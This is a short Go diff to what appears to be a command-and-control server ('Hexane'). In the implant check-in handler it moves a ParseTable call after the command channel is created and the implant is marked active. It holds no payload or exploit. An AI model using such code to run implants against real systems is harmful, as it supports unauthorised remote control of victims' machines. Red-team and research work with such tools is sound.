@@ -32,15 +32,13 @@ func (h *HexaneConfig) ProcessParser(parser *Parser) ([]byte, error) {
 	switch parser.MsgType {
 
 	case TypeCheckin:
-		parser.ParseTable()
-
 		h.CommandChan = make(chan string, 5) // implant is checked-in
 		h.Active = true
 
+		parser.ParseTable()
 		return []byte(strconv.Itoa(int(parser.PeerId))), nil
 
 	case TypeResponse:
-
 		parser.ParseTable()
 		return h.DispatchCommand()
 
